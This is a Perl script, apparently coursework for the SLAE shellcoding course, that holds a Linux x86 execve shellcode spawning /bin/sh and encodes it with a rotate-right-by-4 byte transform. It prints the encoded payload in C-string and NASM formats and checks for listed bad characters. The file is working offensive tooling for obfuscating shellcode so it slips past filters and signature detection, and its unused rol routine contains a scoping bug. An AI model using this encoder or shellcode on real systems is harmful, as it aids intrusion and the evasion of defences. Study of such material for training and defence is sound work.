#Author: John Stigerwalt
#Program Function: Takes shellcode and encodes with ROR-4
#SLAE Assignment #4
#

# Orginal Shellcode
$code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

#Set Value and convert to Hex using unpack
$ror = 4;
print "\n"."---------------------------------"."\n";
print "Using ROR Shift: ".$ror."\n";

# use hex of $code
$hexcode = unpack("H*",$code);
$hexlen = length($code);

print "[+] Hex code: ".$hexcode."\n";
print "Hex Length: ".$hexlen."\n";

#Orginal Push Array
@enc;

# Formating Push Arrays
@encx;
@enco;
@org;


for ($i=0;$i<$hexlen;$i++) {
	
	 $encoded = unpack("H*", substr($code,$i,1));
	 
	 $addx = "0x" . $encoded . ",";
	 push @org, $addx;
	 
	 $h = hex $encoded;
	 $k = sprintf("%d", $h);

	 #ROR bitwise operation
	 
	 $j = &ror($k, $ror);
	  
	 $bit = sprintf("%02x", $j);
	
	 push @enc, $bit;	 
}

foreach $x (@enc) {
	$zx = "0x" . $x . ",";
	push @encx, $zx;
	
	$zc = "\\x" . $x;
	push @enco, $zc;
	
	if ($zx eq "0x00") {
		warn "Shellcode contains: \"0x00\" ";
	}
	if ($zx eq "0xbb") {
		warn "Shellcode contains: \"0xbb\" ";
	}
	if ($zx eq "0x61") {
		warn "Shellcode contains: \"0x61\" ";
	}
	if ($zx eq "0xa0") {
		warn "Shellcode contains: \"0xa0\" ";
	}
	if ($zx eq "0xc6") {
		warn "Shellcode contains: \"0xc6\" ";
	}
	
}

print "\nOrginal Shellcode: " . "\"";
print @org;
print "\""."\n\n";

print "\nROR ".$ror." Enocded Shellcode Format: " . "\"";
print @enco;
print "\""."\n\n";

print "\nROR ".$ror." Encoded NASM Format: " . "\"";
print @encx;
print "\""."\n\n";


sub rol {
    # Usage: &rol(number, n)
    # Rotate 'number' by 'n' bits left
    my $number = shift;
    my $bits2rotate = shift;
    for (1..$bits2rotate) {
        # Shift left 1 bit
        $number = $number << 1;
        my $rmb = 0;
        if ($number > 255) {
            my $rmb = 1;
            $number -= 255;
        }
        $number += $rmb;
    }
    return $number;
}

sub ror {
    # Usage: &ror(number, n)
    # Rotate 'number' by 'n' bits right
    my $number = shift;
    my $bits2rotate = shift;
    for (1..$bits2rotate) {
        # Get right-most bit
        my $rmb = $number & 0b00000001;
        # Shift right 1 bit
        $number = $number >> 1;
        # Set left-most bit if the right-most bit of the number was == 1
        if ($rmb == 1) {
            $number = $number | 0b10000000;
        }
    }
    return $number;
}

exit(1);
